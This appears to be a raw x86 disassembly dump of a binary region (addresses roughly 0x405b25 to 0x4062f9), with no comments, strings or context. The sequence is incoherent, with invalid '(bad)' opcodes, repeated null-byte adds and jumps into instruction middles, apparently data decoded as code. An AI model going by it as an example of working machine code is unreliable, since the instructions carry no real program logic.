  405b25:	add    eax,DWORD PTR [eax]
  405b27:	jne    0x405b84
  405b29:	add    eax,DWORD PTR [eax]
  405b2b:	jne    0x405b88
  405b2d:	add    eax,DWORD PTR [eax]
  405b2f:	jne    0x405b8c
  405b31:	add    eax,DWORD PTR [eax]
  405b33:	jne    0x405b90
  405b35:	add    eax,DWORD PTR [eax]
  405b37:	jne    0x405b94
  405b39:	add    eax,DWORD PTR [eax]
  405b3b:	jne    0x405b98
  405b3d:	add    eax,DWORD PTR [eax]
  405b3f:	jne    0x405b9c
  405b41:	add    eax,DWORD PTR [eax]
  405b43:	jne    0x405ba0
  405b45:	add    eax,DWORD PTR [eax]
  405b47:	jne    0x405ba4
  405b49:	add    eax,DWORD PTR [eax]
  405b4b:	jne    0x405ba8
  405b4d:	add    eax,DWORD PTR [eax]
  405b4f:	jne    0x405bac
  405b51:	add    eax,DWORD PTR [eax]
  405b53:	jne    0x405bb0
  405b55:	add    eax,DWORD PTR [eax]
  405b57:	jne    0x405bb4
  405b59:	add    eax,DWORD PTR [eax]
  405b5b:	jne    0x405bb8
  405b5d:	add    eax,DWORD PTR [eax]
  405b5f:	jne    0x405bbc
  405b61:	add    eax,DWORD PTR [eax]
  405b63:	jne    0x405bc0
  405b65:	add    eax,DWORD PTR [eax]
  405b67:	jne    0x405bc4
  405b69:	add    eax,DWORD PTR [eax]
  405b6b:	jne    0x405bc8
  405b6d:	add    eax,DWORD PTR [eax]
  405b6f:	jne    0x405bcb
  405b71:	add    eax,0x35b7500
  405b76:	add    BYTE PTR [eax],al
  405b78:	add    BYTE PTR [eax],al
  405b7a:	add    BYTE PTR [eax],al
  405b7c:	jne    0x405b80
  405b7e:	jmp    0x405b85
  405b80:	jne    0x405b84
  405b82:	jmp    0x405b87
  405b84:	jne    0x405b88
  405b86:	call   0xe542d08d
  405b8b:	add    esi,DWORD PTR [ebp+0x2]
  405b8e:	jmp    0x405b92
  405b90:	jne    0x405b94
  405b92:	out    0x3,eax
  405b94:	jne    0x405b98
  405b96:	add    DWORD PTR [ebx],0x7fb50250
  405b9c:	xor    eax,0x7803e602
  405ba1:	add    cl,BYTE PTR [ebp+0x4b02357f]
  405ba7:	add    esp,DWORD PTR [edx-0x4a8032fe]
  405bad:	add    dh,BYTE PTR [ebp+0x3]
  405bb0:	js     0x405bb4
  405bb2:	mov    ch,0x7f
  405bb4:	mov    ch,0x2
  405bb6:	pop    DWORD PTR [ebx]
  405bb8:	js     0x405bbc
  405bba:	mov    ebp,0x3002b57f
  405bbf:	add    al,0x73
  405bc1:	add    bh,ch
  405bc3:	jg     0x405b7a
  405bc5:	add    bh,BYTE PTR [ecx]
  405bc7:	add    al,0x89
  405bc9:	add    ah,ch
  405bcb:	jg     0x405b82
  405bcd:	add    al,bl
  405bcf:	add    al,0x6c
  405bd1:	add    al,cl
  405bd3:	jnp    0x405b8a
  405bd5:	add    cl,cl
  405bd7:	add    al,0x7b
  405bd9:	add    bh,BYTE PTR [ecx+0xb02b57b]
  405bdf:	add    al,0x0
  405be1:	add    BYTE PTR [eax],al
  405be3:	add    BYTE PTR [eax],al
  405be5:	js     0x405be9
  405be7:	xchg   ecx,eax
  405be8:	jnp    0x405b9f
  405bea:	add    bl,BYTE PTR [esi]
  405bec:	add    al,0x76
  405bee:	add    al,BYTE PTR [ebp+0x5002357b]
  405bf4:	add    al,0x86
  405bf6:	add    bl,BYTE PTR [ecx+0x2357b]
  405bfc:	add    DWORD PTR [ecx-0x8],edi
  405bff:	jmp    DWORD PTR [esi+ecx*2+0x76b0ffc2]
  405c06:	add    al,0x0
  405c08:	popf   
  405c09:	ds ret 0x6cff
  405c0d:	jns    0x405c13
  405c0f:	add    BYTE PTR [ebp+0x3bffc22e],dl
  405c15:	jns    0x405c12
  405c17:	call   DWORD PTR [eax+0x54ffc21e]
  405c1d:	jns    0x405c25
  405c1f:	add    BYTE PTR [ecx-0x8003df2],cl
  405c25:	jbe    0x405c21
  405c27:	push   DWORD PTR [esi+edi*8-0x3f]
  405c2b:	jmp    edi
  405c2d:	jbe    0x405c2b
  405c2f:	jmp    DWORD PTR [esi+ebp*8-0x3e]
  405c33:	(bad)  
  405c34:	cmp    al,0x79
  405c36:	(bad)  
  405c37:	jmp    FWORD PTR [eax-0x22]
  405c3a:	ret    0x97ff
  405c3d:	jbe    0x405c45
  405c3f:	add    BYTE PTR [ecx-0x31],dh
  405c42:	ret    0x16ff
  405c45:	jns    0x405c40
  405c47:	dec    DWORD PTR [eax+eax*1+0x0]
  405c4b:	add    BYTE PTR [eax],al
  405c4d:	add    BYTE PTR [esi+0x79ffffc2],bh
  405c53:	xor    al,BYTE PTR [eax]
  405c55:	adc    DWORD PTR [esi+0x76b4ffc2],ebp
  405c5b:	add    eax,DWORD PTR [eax]
  405c5d:	stc    
  405c5e:	lahf   
  405c5f:	ret    0x1eff
  405c62:	jns    0x405c5d
  405c64:	inc    DWORD PTR [esi+ecx*4]
  405c67:	ret    0xd4ff
  405c6a:	jbe    0x405c64
  405c6c:	inc    DWORD PTR [eax]
  405c6e:	jle    0x405c32
  405c70:	dec    DWORD PTR [edi+0x76]
  405c73:	adc    BYTE PTR [eax],al
  405c75:	in     eax,0x6f
  405c77:	ret    0xffff
  405c7a:	icebp  
  405c7b:	call   FWORD PTR [edi]
  405c7d:	add    ah,ch
  405c7f:	jmp    0xff9f5cc3
  405c84:	add    eax,DWORD PTR [eax]
  405c86:	in     al,0xe9
  405c88:	aas    
  405c89:	add    BYTE PTR [ecx-0x1fffdf01],dh
  405c8f:	jmp    0xffe55cd3
  405c94:	xor    DWORD PTR [eax],eax
  405c96:	sbb    al,0xe9
  405c98:	aas    
  405c99:	add    ch,ah
  405c9b:	jmp    DWORD PTR [ecx]
  405c9d:	add    al,bh
  405c9f:	jmp    0x1b5ce3
  405ca4:	or     eax,DWORD PTR [eax]
  405ca6:	call   0xfa409c94
  405cab:	call   FWORD PTR [edx]
  405cad:	add    BYTE PTR [ecx+ebp*8+0x3f],bl
  405cb4:	add    BYTE PTR [eax],al
  405cb6:	add    BYTE PTR [ebp-0x1],bl
  405cb9:	push   cs
  405cba:	add    BYTE PTR [ecx+ebp*8],bh
  405cbd:	aas    
  405cbe:	add    BYTE PTR [eax+0x400007ff],dh
  405cc4:	jmp    0xff245d08
  405cc9:	add    al,0x0
  405ccb:	sub    cl,ch
  405ccd:	aas    
  405cce:	add    BYTE PTR [ebx+0x44000206],bl
  405cd4:	jmp    0x6a45d18
  405cd9:	adc    al,0x0
  405cdb:	dec    esp
  405cdc:	out    0x3f,eax
  405cde:	add    BYTE PTR [eax-0x7ffeefa],ah
  405ce4:	out    0x3f,al
  405ce6:	add    BYTE PTR [eax+0x6],bh
  405ce9:	adc    DWORD PTR [eax],eax
  405ceb:	aam    0xe6
  405ced:	aas    
  405cee:	add    BYTE PTR [edi-0x33fff8fa],cl
  405cf4:	out    0x3f,al
  405cf6:	add    BYTE PTR [ebp+0x3],dh
  405cf9:	add    al,0xe
  405cfb:	jne    0x405cc6
  405cfd:	jp     0x405d3f
  405cff:	jne    0x405cc2
  405d01:	add    ecx,DWORD PTR [esi*2+0x75407ab9]
  405d08:	sbb    al,0x4
  405d0a:	add    al,0x75
  405d0c:	sar    DWORD PTR [edx+0x40],1
  405d0f:	jne    0x405cf3
  405d11:	add    eax,DWORD PTR [edi]
  405d13:	jne    0x405cfe
  405d15:	jp     0x405d57
  405d17:	jne    0x405d04
  405d19:	add    ecx,DWORD PTR ds:0x0
  405d1f:	add    BYTE PTR [ebp-0x27],dh
  405d22:	jp     0x405d64
  405d24:	jne    0x405d37
  405d26:	add    al,0x8
  405d28:	jne    0x405cdf
  405d2a:	jp     0x405d6c
  405d2c:	jne    0x405cbc
  405d2e:	add    ecx,DWORD PTR [eax]
  405d30:	jne    0x405d73
  405d32:	jp     0x405d74
  405d34:	jne    0x405d76
  405d36:	add    eax,DWORD PTR [edi]
  405d38:	jne    0x405db3
  405d3a:	jp     0x405d7c
  405d3c:	jne    0x405d05
  405d3e:	add    edx,DWORD PTR ds:0x407aa375
  405d44:	jne    0x405d5c
  405d46:	add    al,0xb
  405d48:	jne    0x405cf1
  405d4a:	jp     0x405d8c
  405d4c:	jne    0x405d47
  405d4e:	add    ecx,DWORD PTR [ebx]
  405d50:	jne    0x405cfd
  405d52:	jp     0x405d94
  405d54:	jne    0x405d0e
  405d56:	add    edx,DWORD PTR [edx]
  405d58:	jne    0x405dc1
  405d5a:	jp     0x405d9c
  405d5c:	jne    0x405cf2
  405d5e:	add    ecx,DWORD PTR [ecx]
  405d60:	jne    0x405dcd
  405d62:	jp     0x405da4
  405d64:	jne    0x405dba
  405d66:	add    edx,DWORD PTR [ebx]
  405d68:	jne    0x405d11
  405d6a:	jnp    0x405dac
  405d6c:	jne    0x405d2b
  405d6e:	add    ecx,DWORD PTR [eax]
  405d70:	jne    0x405d1d
  405d72:	jnp    0x405db4
  405d74:	jne    0x405d78
  405d76:	rol    DWORD PTR [ebx],0x6a
  405d79:	add    cl,BYTE PTR [ecx-0x48fdca85]
  405d7f:	add    esi,DWORD PTR [edx+0x2]
  405d82:	mov    cl,0x7b
  405d84:	add    BYTE PTR [eax],al
  405d86:	add    BYTE PTR [eax],al
  405d88:	add    BYTE PTR ds:0x6903e102,dh
  405d8e:	add    dh,BYTE PTR [ecx-0x9fdca85]
  405d94:	add    edi,DWORD PTR [edx+eax*1+0x2d]
  405d98:	jnp    0x405dcf
  405d9a:	add    ah,bh
  405d9c:	add    ebp,DWORD PTR [edi+0x2]
  405d9f:	cdq    
  405da0:	jnp    0x405dd7
  405da2:	add    ch,BYTE PTR [eax]
  405da4:	add    esi,DWORD PTR [ecx+0x2]
  405da7:	cmp    DWORD PTR [ebx+0x35],0x3303cf02
  405dae:	add    ecx,ecx
  405db0:	test   BYTE PTR ds:0x20037302,dh
  405db6:	add    ah,cl
  405db8:	test   BYTE PTR ds:0x4c031802,dh
  405dbe:	add    bh,BYTE PTR ds:0x6302b585
  405dc4:	add    edi,DWORD PTR [edi+0x2]
  405dc7:	cmp    DWORD PTR [ebp+0x32b02b5],eax
  405dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dce:	add    bl,BYTE PTR [ebp-0x7b]
  405dd1:	mov    ch,0x2
  405dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dd4:	add    esi,DWORD PTR [edx+0x2]
  405dd7:	push   ebp
  405dd8:	test   DWORD PTR [ebp+0x6c046b02],esi
  405dde:	add    dh,BYTE PTR [ecx-0x7e]
  405de1:	mov    ch,0x2
  405de3:	jg     0x405de9
  405de5:	pop    ecx
  405de6:	add    dh,BYTE PTR [ecx]
  405de8:	xor    BYTE PTR [ebp+0x41902],0x0
  405def:	add    BYTE PTR [eax],al
  405df1:	add    BYTE PTR [ecx+0x2],ch
  405df4:	xor    DWORD PTR [edx+0x760002b5],eax
  405dfa:	jno    0x405dba
  405dfc:	(bad)  
  405dfd:	call   0xbb401ff6
  405e02:	jno    0x405e02
  405e04:	jmp    DWORD PTR [eax-0xe003e0c]
  405e0a:	jbe    0x405e0a
  405e0c:	call   FWORD PTR [eax-0x1a003e0c]
  405e12:	jbe    0x405e10
  405e14:	inc    DWORD PTR [esp+esi*8+0x76ccffc1]
  405e1b:	add    BYTE PTR [eax],al
  405e1d:	(bad)  
  405e1e:	hlt    
  405e1f:	sar    edi,0x4a
  405e22:	jno    0x405e44
  405e24:	add    BYTE PTR [ebp-0x28003e0c],dl
  405e2a:	jbe    0x405e2b
  405e2c:	(bad)  
  405e2d:	jl     0x405e23
  405e2f:	sar    edi,0x59
  405e32:	jno    0x405e35
  405e34:	add    BYTE PTR [ebp+0x61ffc1f4],al
  405e3a:	jno    0x405e41
  405e3c:	add    BYTE PTR [ecx+0x6fffc1f4],cl
  405e42:	jno    0x405e55
  405e44:	add    BYTE PTR [ecx-0xc],dh
  405e47:	ret    0x8eff
  405e4a:	jbe    0x405e43
  405e4c:	call   DWORD PTR [eax-0x6d003d0b]
  405e52:	jbe    0x405e51
  405e54:	(bad)  
  405e55:	js     0x405e57
  405e57:	add    BYTE PTR [eax],al
  405e59:	add    BYTE PTR [eax],al
  405e5b:	cmc    
  405e5c:	ret    0xbaff
  405e5f:	jbe    0x405e6f
  405e61:	add    BYTE PTR [ecx+0x32ffc2f5],dl
  405e67:	jno    0x405e71
  405e69:	add    BYTE PTR [ecx],ah
  405e6b:	hlt    
  405e6c:	ret    0x38ff
  405e6f:	jno    0x405e70
  405e71:	call   FWORD PTR [eax]
  405e73:	hlt    
  405e74:	ret    0xffff
  405e77:	xor    eax,DWORD PTR [eax+edx*1]
  405e7a:	add    BYTE PTR [eax],dh
  405e7c:	add    DWORD PTR [eax+0x0],0x40
  405e80:	inc    BYTE PTR ds:0x40832800
  405e86:	add    ah,cl
  405e88:	add    eax,DWORD PTR [ebx]
  405e8a:	add    ah,ch
  405e8c:	add    BYTE PTR [eax+0x0],0xd1
  405e90:	add    ebp,DWORD PTR [edi]
  405e92:	add    ah,ch
  405e94:	out    0x3f,eax
  405e96:	add    BYTE PTR [edi],cl
  405e98:	add    al,0x17
  405e9a:	add    BYTE PTR [eax+ebp*8],al
  405e9d:	aas    
  405e9e:	add    BYTE PTR [edi],cl
  405ea0:	add    al,0x1a
  405ea2:	add    BYTE PTR [eax-0x32ffc019],al
  405ea8:	add    ecx,DWORD PTR [edi]
  405eaa:	add    BYTE PTR [eax],dh
  405eac:	out    0x3f,eax
  405eae:	add    BYTE PTR [ecx+0x3],dl
  405eb1:	adc    al,0x0
  405eb3:	sbb    bh,ah
  405eb5:	aas    
  405eb6:	add    BYTE PTR [ebx+eax*1],dh
  405eb9:	pop    ds
  405eba:	add    BYTE PTR [eax+0x3fe7],bh
  405ec0:	add    BYTE PTR [eax],al
  405ec2:	add    BYTE PTR [eax],al
  405ec4:	mov    DWORD PTR [ebx],0xe7900024
  405eca:	aas    
  405ecb:	add    BYTE PTR [edi+0x4c000a03],ch
  405ed1:	out    0x3f,eax
  405ed3:	add    BYTE PTR [ebp+0x34000403],ch
  405ed9:	out    0x3f,eax
  405edb:	add    BYTE PTR [ecx+0x3c000403],dh
  405ee1:	out    0x3f,eax
  405ee3:	add    BYTE PTR [edi+0x3],bh
  405ee6:	or     al,0x0
  405ee8:	sbb    al,0xe7
  405eea:	aas    
  405eeb:	add    bh,dh
  405eed:	std    
  405eee:	adc    BYTE PTR [eax],al
  405ef0:	push   eax
  405ef1:	jge    0x405f33
  405ef3:	add    BYTE PTR [ebp+0x28],dh
  405ef6:	add    al,0xe
  405ef8:	jne    0x405e9f
  405efa:	test   DWORD PTR [eax+0x75],eax
  405efd:	lock add ecx,DWORD PTR [esi*2+0x75408585]
  405f05:	fadd   QWORD PTR [ebx]
  405f07:	adc    dh,BYTE PTR [ebp-0x5f]
  405f0a:	test   DWORD PTR [eax+0x75],eax
  405f0d:	out    0x3,eax
  405f0f:	push   ds
  405f10:	jne    0x405ee3
  405f12:	test   BYTE PTR [eax+0x75],al
  405f15:	push   esi
  405f16:	add    esi,DWORD PTR [ecx]
  405f18:	jne    0x405f27
  405f1a:	test   DWORD PTR [eax+0x75],eax
  405f1d:	rol    BYTE PTR [ebx],cl
  405f1f:	or     DWORD PTR [ebp+0x11],esi
  405f22:	test   DWORD PTR [eax+0x75],eax
  405f25:	imul   eax,DWORD PTR [ebx],0xc
  405f2b:	add    BYTE PTR [eax],al
  405f2d:	jne    0x405f40
  405f2f:	test   DWORD PTR [eax+0x75],eax
  405f32:	pop    esp
  405f33:	add    ecx,DWORD PTR [esi*2+0x754084b1]
  405f3a:	dec    ebx
  405f3b:	add    eax,DWORD PTR [edi]
  405f3d:	jne    0x405ed8
  405f3f:	test   BYTE PTR [eax+0x75],al
  405f42:	and    al,0x4
  405f44:	adc    al,0x75
  405f46:	adc    DWORD PTR [ebp+0x3c07540],eax
  405f4c:	add    al,0x75
  405f4e:	stc    
  405f4f:	test   BYTE PTR [eax+0x75],al
  405f52:	rol    BYTE PTR [ebx],1
  405f54:	add    al,0x75
  405f56:	add    eax,DWORD PTR [ebp+0x4257540]
  405f5c:	add    al,0x75
  405f5e:	imul   eax,DWORD PTR [eax+eax*2+0x603b775],0x75
  405f66:	jae    0x405eec
  405f68:	inc    eax
  405f69:	jne    0x405f1f
  405f6b:	add    ecx,DWORD PTR [esi*2+0x75408573]
  405f72:	add    ah,BYTE PTR [edx-0x26fd86fd]
  405f78:	test   DWORD PTR [ebp-0x7cfbbefe],esi
  405f7e:	add    bh,BYTE PTR [ecx+0x5802b585]
  405f84:	add    edi,DWORD PTR [edx+0x2]
  405f87:	mov    cl,0x85
  405f89:	mov    ch,0x2
  405f8b:	mov    BYTE PTR [ebx],al
  405f8d:	jb     0x405f91
  405f8f:	jno    0x405f16
  405f91:	add    BYTE PTR [eax],al
  405f93:	add    BYTE PTR [eax],al
  405f95:	add    BYTE PTR [ebp+0x7e037c02],dh
  405f9b:	add    cl,BYTE PTR [ebp-0x7b]
  405f9e:	xor    eax,0x6c042502
  405fa3:	add    cl,BYTE PTR [ecx-0x7b]
  405fa6:	xor    eax,0x8003be02
  405fab:	add    bl,BYTE PTR [ecx-0x7b]
  405fae:	xor    eax,0x6f03db02
  405fb3:	add    ah,BYTE PTR [ebp-0x7b]
  405fb6:	xor    eax,0x80034402
  405fbb:	add    dl,ch
  405fbd:	test   DWORD PTR ds:0x8b038102,esi
  405fc3:	add    ch,BYTE PTR [ebp+0x53023585]
  405fc9:	add    ebp,DWORD PTR [eax+0x2]
  405fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fcd:	test   DWORD PTR ds:0x69038d02,esi
  405fd3:	add    bh,ch
  405fd5:	test   DWORD PTR ds:0x82032a02,esi
  405fdb:	add    bh,ch
  405fdd:	test   DWORD PTR [ebp+0x71031502],esi
  405fe3:	add    bl,ch
  405fe5:	test   DWORD PTR [ebp+0x7e036c02],esi
  405feb:	add    ch,cl
  405fed:	test   DWORD PTR [ebp+0x766d0002],esi
  405ff3:	idiv   bh
  405ff5:	clc    
  405ff6:	hlt    
  405ff7:	sar    edi,0x54
  405ffa:	add    BYTE PTR [eax],al
  405ffc:	add    BYTE PTR [eax],al
  405ffe:	add    BYTE PTR [ecx+0x12],bh
  406001:	add    BYTE PTR [ebp+0x3effc1f0],bh
  406007:	jns    0x40601a
  406009:	add    BYTE PTR [ecx+0x23ffc1f0],ah
  40600f:	jns    0x406005
  406011:	inc    DWORD PTR [eax+0x34ffc1f0]
  406017:	jns    0x40602c
  406019:	add    BYTE PTR [ebp-0x53003e10],al
  40601f:	jns    0x406015
  406021:	push   DWORD PTR [eax+esi*8-0x3f]
  406025:	push   DWORD PTR [edx+0x69001279]
  40602b:	lock sar edi,0x48
  40602f:	jns    0x406044
  406031:	add    BYTE PTR ds:0xc5ffc1f0,cl
  406037:	jbe    0x406048
  406039:	add    BYTE PTR ds:0xe0ffc1f0,dl
  40603f:	jbe    0x40604f
  406041:	add    BYTE PTR ds:0x83ffc1f0,bl
  406047:	jns    0x406056
  406049:	add    BYTE PTR ds:0xf9ffc1f0,al
  40604f:	jbe    0x406061
  406051:	add    cl,bl
  406053:	icebp  
  406054:	sar    edi,0xf5
  406057:	jbe    0x406063
  406059:	add    BYTE PTR ds:0xf5ffc1f1,dh
  40605f:	jbe    0x40606a
  406061:	add    BYTE PTR [ecx+0x0],al
  406064:	add    BYTE PTR [eax],al
  406066:	add    BYTE PTR [eax],al
  406068:	icebp  
  406069:	ret    0x38ff
  40606c:	jns    0x40608d
  40606e:	add    BYTE PTR [ebp-0xf],dl
  406071:	ret    0xffff
  406074:	xor    eax,0xd8002500
  406079:	jle    0x4060bb
  40607b:	add    BYTE PTR [esi+0x0],cl
  40607e:	sbb    eax,DWORD PTR [eax]
  406080:	mov    esp,0x8900407f
  406085:	inc    BYTE PTR [edx]
  406087:	add    BYTE PTR [eax-0x2dffbf82],bh
  40608d:	inc    DWORD PTR [esi]
  40608f:	add    BYTE PTR [eax+0x6200407e],dh
  406095:	inc    BYTE PTR [esi]
  406097:	add    BYTE PTR [eax+0x7e],ch
  40609a:	inc    eax
  40609b:	add    BYTE PTR [ebx-0x2],al
  40609e:	sbb    eax,DWORD PTR [eax]
  4060a0:	or     BYTE PTR [eax-0x27ffc0],al
  4060a6:	push   es
  4060a7:	add    al,al
  4060a9:	jg     0x4060eb
  4060ab:	add    BYTE PTR [esi],ah
  4060ad:	add    BYTE PTR [edx],cl
  4060af:	add    BYTE PTR [edi+edi*2-0x72ffc0],dh
  4060b6:	dec    ebx
  4060b7:	add    BYTE PTR [ebx*2-0x3affc1],dl
  4060be:	and    DWORD PTR [eax],eax
  4060c0:	jl     0x40611e
  4060c2:	aas    
  4060c3:	add    BYTE PTR [edx],bh
  4060c5:	jmp    FWORD PTR ds:0x3f5c1c00
  4060cb:	add    BYTE PTR [eax],al
  4060cd:	add    BYTE PTR [eax],al
  4060cf:	add    BYTE PTR [eax],al
  4060d1:	stos   BYTE PTR es:[edi],al
  4060d2:	inc    DWORD PTR [ebx]
  4060d4:	add    ah,al
  4060d6:	pop    esp
  4060d7:	aas    
  4060d8:	add    BYTE PTR [eax-0x4fffed01],cl
  4060de:	pop    esp
  4060df:	aas    
  4060e0:	add    BYTE PTR [ebx-0x27ffec01],dh
  4060e6:	pop    esp
  4060e7:	aas    
  4060e8:	add    BYTE PTR [ecx-0x2],bh
  4060eb:	sbb    eax,0x3f5c3800
  4060f0:	add    BYTE PTR [ebp+0x10],dh
  4060f3:	add    ebx,DWORD PTR ds:0x3fe64575
  4060f9:	jne    0x4060e1
  4060fb:	add    ah,BYTE PTR [eax]
  4060fd:	jne    0x406110
  4060ff:	in     eax,0x3f
  406101:	jne    0x406133
  406103:	add    esp,DWORD PTR [edi+0x75]
  406106:	ftst   
  406108:	aas    
  406109:	jne    0x40612a
  40610b:	add    al,0x5
  40610d:	jne    0x4060dc
  40610f:	in     eax,0x3f
  406111:	jne    0x4060ae
  406113:	add    al,0xa
  406115:	jne    0x4060d8
  406117:	in     eax,0x3f
  406119:	jne    0x4060c6
  40611b:	add    al,0x39
  40611d:	jne    0x406114
  40611f:	in     eax,0x3f
  406121:	jne    0x4060ef
  406123:	add    ebp,DWORD PTR ds:0x3fe79575
  406129:	jne    0x406165
  40612b:	add    eax,DWORD PTR [edi]
  40612d:	jne    0x4060bc
  40612f:	out    0x3f,eax
  406131:	jne    0x4061b1
  406133:	add    al,0xc
  406135:	add    BYTE PTR [eax],al
  406137:	add    BYTE PTR [eax],al
  406139:	add    BYTE PTR [ebp+0x7d],dh
  40613c:	out    0x3f,eax
  40613e:	jne    0x40611e
  406140:	add    ecx,DWORD PTR [ebx]
  406142:	jne    0x4060e5
  406144:	out    0x3f,eax
  406146:	jne    0x4060d5
  406148:	add    al,0xb
  40614a:	jne    0x4060d1
  40614c:	out    0x3f,eax
  40614e:	jne    0x406108
  406150:	add    ecx,DWORD PTR [edx]
  406152:	jne    0x40616d
  406154:	out    0x3f,eax
  406156:	jne    0x406184
  406158:	add    al,0xb
  40615a:	jne    0x4060e9
  40615c:	out    0x3f,eax
  40615e:	jne    0x4061cc
  406160:	add    ecx,DWORD PTR [esi*2+0x753fe77d]
  406167:	fild   DWORD PTR [ebx]
  406169:	sub    al,0x75
  40616b:	lods   eax,DWORD PTR ds:[esi]
  40616c:	out    0x3f,al
  40616e:	jne    0x406172
  406170:	in     al,0x3
  406172:	jle    0x406176
  406174:	xchg   ecx,eax
  406175:	out    0xa2,al
  406177:	add    dh,ch
  406179:	add    eax,DWORD PTR [ebp-0x6d194afe]
  40617f:	add    bl,BYTE PTR [esi-0x4efd81fd]
  406185:	out    0x82,al
  406187:	add    dh,BYTE PTR [eax+0x3]
  40618a:	outs   dx,BYTE PTR ds:[esi]
  40618b:	add    ch,BYTE PTR [ebp-0x7cfd8d1a]
  406191:	add    esi,DWORD PTR [edx+0x2]
  406194:	adc    eax,0xe20262e7
  406199:	add    eax,DWORD PTR [edi+0xe70902]
  40619f:	add    BYTE PTR [eax],al
  4061a1:	add    BYTE PTR [eax],al
  4061a3:	push   edx
  4061a4:	add    bh,BYTE PTR [ecx]
  4061a6:	add    al,0x53
  4061a8:	add    al,cl
  4061aa:	out    0x42,eax
  4061ac:	add    al,BYTE PTR [ebx-0x3efd96fd]
  4061b2:	out    0xb2,eax
  4061b4:	add    dh,BYTE PTR [ebx]
  4061b6:	add    al,0x80
  4061b8:	add    bh,BYTE PTR [ecx+0x1402a2e7]
  4061be:	add    al,0x68
  4061c0:	add    ch,BYTE PTR [ecx+0x300292e7]
  4061c6:	add    al,0x64
  4061c8:	add    cl,BYTE PTR [ebp-0x19]
  4061cb:	add    BYTE PTR [edx],0x3
  4061ce:	add    al,0x6e
  4061d0:	add    cl,BYTE PTR [ecx-0x19]
  4061d3:	jb     0x4061d7
  4061d5:	push   edi
  4061d6:	add    ecx,DWORD PTR [edx+0x62e76902]
  4061dc:	add    dl,al
  4061de:	add    ebp,DWORD PTR [edx+eax*1-0x2b]
  4061e2:	out    0x52,eax
  4061e4:	add    cl,BYTE PTR [ebx+eax*1+0x76]
  4061e8:	add    bh,BYTE PTR [ecx+0x242e7]
  4061ee:	jmp    0xe9406469
  4061f3:	jbe    0x4061f7
  4061f5:	add    BYTE PTR [eax+0x77],cl
  4061f8:	push   es
  4061f9:	add    DWORD PTR [ebx+0x77],ecx
  4061fc:	cmp    al,BYTE PTR [edx]
  4061fe:	dec    edx
  4061ff:	ja     0x4061c4
  406201:	add    BYTE PTR [edi+esi*2+0x1f],al
  406205:	add    DWORD PTR [edi+0x0],ecx
  406208:	add    BYTE PTR [eax],al
  40620a:	add    BYTE PTR [eax],al
  40620c:	ja     0x4061ca
  40620e:	add    BYTE PTR [eax+0x77],dl
  406211:	loop   0x406213
  406213:	inc    ebx
  406214:	ja     0x4061d6
  406216:	add    BYTE PTR [edx+0x77],al
  406219:	out    0x0,al
  40621b:	xchg   ebp,eax
  40621c:	jo     0x4061f9
  40621e:	add    BYTE PTR [edi-0x79ff2088],cl
  406224:	jo     0x406203
  406226:	add    BYTE PTR [eax+0x7b010778],bl
  40622c:	jo     0x40626b
  40622e:	add    bh,BYTE PTR [edx+0x78]
  406231:	les    eax,FWORD PTR [eax]
  406233:	jl     0x4062a5
  406235:	and    BYTE PTR [ecx],al
  406237:	ja     0x4062b1
  406239:	mov    ebp,0x49705e00
  40623e:	add    ah,BYTE PTR [eax+0x78]
  406241:	jecxz  0x406243
  406243:	push   ebx
  406244:	jo     0x406207
  406246:	add    BYTE PTR [edx+0x78],dl
  406249:	out    0x0,eax
  40624b:	inc    ebp
  40624c:	jo     0x40622a
  40624e:	add    BYTE PTR [eax+edi*2],bh
  406251:	aas    
  406252:	add    dh,BYTE PTR [edi]
  406254:	jo     0x406236
  406256:	add    BYTE PTR [esi],ch
  406258:	js     0x406238
  40625a:	add    BYTE PTR [ecx],ch
  40625c:	jo     0x406214
  40625e:	add    BYTE PTR [edx],ch
  406260:	js     0x406266
  406262:	add    DWORD PTR [eax+esi*2],ebp
  406265:	sbb    eax,DWORD PTR [ecx]
  406267:	daa    
  406268:	js     0x406272
  40626a:	add    DWORD PTR [eax],eax
  40626c:	inc    esp
  40626d:	pop    es
  40626e:	or     al,0x1
  406270:	add    BYTE PTR [eax],al
  406272:	add    BYTE PTR [eax],al
  406274:	add    BYTE PTR [esi+0x7],al
  406277:	sbb    BYTE PTR [ecx],al
  406279:	push   eax
  40627a:	pop    es
  40627b:	sbb    al,BYTE PTR [ecx]
  40627d:	xchg   ebx,eax
  40627e:	add    eax,0x5ac010e
  406283:	adc    BYTE PTR [ecx],al
  406285:	popf   
  406286:	add    eax,0x59e0143
  40628b:	inc    edi
  40628c:	add    DWORD PTR [ecx-0x6bfeaffb],ecx
  406292:	add    eax,0x5950158
  406297:	outs   dx,BYTE PTR ds:[esi]
  406298:	add    DWORD PTR [edi+0x5],esp
  40629b:	jo     0x40629e
  40629d:	add    BYTE PTR ds:0x73c0162,0x55
  4062a4:	add    DWORD PTR [edi],ebp
  4062a6:	pop    es
  4062a7:	add    eax,DWORD PTR [ecx]
  4062a9:	sub    DWORD PTR [edi],eax
  4062ab:	cmp    al,BYTE PTR [ecx]
  4062ad:	cmp    al,BYTE PTR [edi]
  4062af:	pop    es
  4062b0:	add    DWORD PTR [edi+eax*1],esp
  4062b3:	or     eax,0x19072601
  4062b8:	add    DWORD PTR [eax],esi
  4062ba:	pop    es
  4062bb:	sbb    eax,DWORD PTR [ecx]
  4062bd:	xor    eax,DWORD PTR [edi]
  4062bf:	sidtd  [edi+eax*1]
  4062c3:	adc    DWORD PTR [ecx],eax
  4062c5:	std    
  4062c6:	push   es
  4062c7:	inc    esp
  4062c8:	add    esi,edi
  4062ca:	push   es
  4062cb:	dec    eax
  4062cc:	add    ecx,ebp
  4062ce:	push   es
  4062cf:	push   ecx
  4062d0:	add    esp,esi
  4062d2:	push   es
  4062d3:	pop    ecx
  4062d4:	add    ebp,esi
  4062d6:	push   es
  4062d7:	outs   dx,DWORD PTR ds:[esi]
  4062d8:	add    DWORD PTR [eax],eax
  4062da:	add    BYTE PTR [eax],al
  4062dc:	add    BYTE PTR [eax],al
  4062de:	inc    edi
  4062df:	push   es
  4062e0:	jno    0x4062e3
  4062e2:	and    al,BYTE PTR [esi]
  4062e4:	arpl   WORD PTR [ecx],ax
  4062e6:	adc    eax,DWORD PTR [esi]
  4062e8:	fld    DWORD PTR [edx]
  4062ea:	in     eax,dx
  4062eb:	add    eax,0x8f750126
  4062f0:	add    eax,0x5827424
  4062f5:	xor    BYTE PTR [esp+esi*2+0x5],dh
  4062f9:	push   ds
